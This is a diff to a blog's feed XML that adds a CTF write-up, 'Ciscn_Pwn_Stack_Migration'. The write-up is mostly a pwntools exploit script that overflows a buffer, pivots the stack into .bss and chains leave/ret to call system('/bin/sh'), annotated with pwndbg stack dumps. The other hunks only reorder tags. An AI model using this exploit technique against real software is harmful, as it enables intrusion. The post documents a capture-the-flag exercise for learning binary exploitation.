@@ -3,6 +3,31 @@
   
     
     <entry>
+      <title>Ciscn_Pwn_Stack_Migration</title>
+      <link href="/2019/07/18/Ciscn-Pwn-Stack-Migration/"/>
+      <url>/2019/07/18/Ciscn-Pwn-Stack-Migration/</url>
+      
+        <content type="html"><![CDATA[<p>Stack migration in Ciscn…</p><a id="more"></a><h1 id="Ciscn-Pwn-Stack-Migration"><a href="#Ciscn-Pwn-Stack-Migration" class="headerlink" title="Ciscn_Pwn_Stack_Migration"></a>Ciscn_Pwn_Stack_Migration</h1><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true"># buf_size = 0x28</span><span class="token comment" spellcheck="true"># read_size = 0x30</span><span class="token comment" spellcheck="true"># buf_addr = ebp - 0x28</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># vul loop1:</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'good boy1'</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">,</span><span class="token string">'b *vul+104'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804b000</span><span class="token operator">-</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'vul'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">''' Program Status──────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────── EAX  0x30 EBX  0x0 ECX  0xfff9442c ◂— 'Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n' EDX  0xf7ee2890 ◂— 0x0 EDI  0xf7ee1000 ◂— 0x1d9d6c ESI  0xf7ee1000 ◂— 0x1d9d6c EBP  0xfff969a8 —▸ 0x804af00 ◂— 0x0 ESP  0xfff96980 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' EIP  0x80485fd (vul+104) ◂— leave  ───────────────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────────────   0x80485ee &lt;vul+89>     push   eax   0x80485ef &lt;vul+90>     push   0x80486ca   0x80485f4 &lt;vul+95>     call   printf@plt &lt;0x80483e0>   0x80485f9 &lt;vul+100>    add    esp, 0x10   0x80485fc &lt;vul+103>    nop     ► 0x80485fd &lt;vul+104>    leave     0x80485fe &lt;vul+105>    ret       0x80485ff &lt;main>       lea    ecx, dword ptr [esp + 4]   0x8048603 &lt;main+4>     and    esp, 0xfffffff0   0x8048606 &lt;main+7>     push   dword ptr [ecx - 4]   0x8048609 &lt;main+10>    push   ebp────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp  0xfff96980 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'... ↓──────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────── ► f 0  80485fd vul+104─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────Breakpoint *vul+104pwndbg> stack 2000:0000│ esp  0xfff96980 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'... ↓0a:0028│ ebp  0xfff969a8 —▸ 0x804af00 ◂— 0x00b:002c│      0xfff969ac —▸ 0x804859b (vul+6) ◂— sub    esp, 4'''</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''**********Notes*************{???} means a program address random....{==>} means point to....{&lt;= } means value at the address'''</span><span class="token triple-quoted-string string">'''*********cover ebp**********ebp = ??? ==> 0x804af00 &lt;= 0'''</span><span class="token triple-quoted-string string">'''***** hijacking ebp and cover return address to vul+6 ******leave:     mov esp,ebp ;            esp = ??? ==>0x804af00 &lt;= 0    pob ebp ;                     esp = ???+4 ;         ebp = 0x804af00 &lt;=0ret vul+6;'''</span><span class="token comment" spellcheck="true">#vul loop2:</span><span class="token comment" spellcheck="true">#gadget</span>leave_ret <span class="token operator">=</span> <span class="token number">0x80484b8</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'good boy2'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804aed8</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/bin/sh\0'</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804aed4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">,</span><span class="token string">'b *vul+104'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''******** send payload ********1.buf_addr = ebp - 0x28 = 0x804af00 - 0x28 = 0x804aed82.(0x804aed8 + 0x10 = 0x804aef8) This value was writed in 0x 804aef0...It means that args point to '/bin/sh' at 0x804aef8...3.ebp = 0x804af00 ==> 0x804aed4 &lt;= 04.leave:        mov esp,ebp:            esp = 0x804af00 ==> 0x804aed4 &lt;= 0 ;         pop ebp:            esp = 0x804af04 ==> leave_ret;            ebp = 0x804aed4;5.ret leave_ret'''</span><span class="token triple-quoted-string string">'''******* leave_ret*********leave:    mov esp,ebp:        esp = 0x804aed4 &lt;= 0;    pop ebp:        esp = 0x804aed8 ==> system        ebp = 0x0;ret system('/bin/sh');----------------------------------------------------------------------------pwndbg> stack 3000:0000│ esp  0x804aed8 —▸ 0x8048400 (system@plt) ◂— jmp    dword ptr [0x804a018]01:0004│      0x804aedc ◂— 0x002:0008│      0x804aee0 —▸ 0x804aee8 ◂— '/bin/sh'03:000c│      0x804aee4 ◂— 0x004:0010│      0x804aee8 ◂— '/bin/sh'05:0014│      0x804aeec ◂— 0x68732f /* '/sh' */06:0018│      0x804aef0 ◂— 0x0... ↓0a:0028│      0x804af00 —▸ 0x804aed4 ◂— 0x00b:002c│      0x804af04 —▸ 0x80484b8 (deregister_tm_clones+40) ◂— leave  0c:0030│      0x804af08 ◂— 0x0------------------------------------------------------------------------------'''</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Ciscn </tag>
+            
+            <tag> Pwn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>Binary_Security_Guidance</title>
       <link href="/2019/07/18/Binary-Security-Guidance/"/>
       <url>/2019/07/18/Binary-Security-Guidance/</url>
@@ -142,11 +167,11 @@
       
         <tags>
             
+            <tag> 网络安全 </tag>
+            
             <tag> 资讯 </tag>
             
             <tag> 译文 </tag>
-            
-            <tag> 网络安全 </tag>
             
         </tags>
       
@@ -171,9 +196,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> ssrf </tag>
-            
             <tag> write-up </tag>
+            
+            <tag> ssrf </tag>
             
         </tags>
       
@@ -248,9 +273,9 @@
       
         <tags>
             
-            <tag> 追踪溯源 </tag>
-            
             <tag> 信息安全 </tag>
+            
+            <tag> 追踪溯源 </tag>
             
         </tags>
       
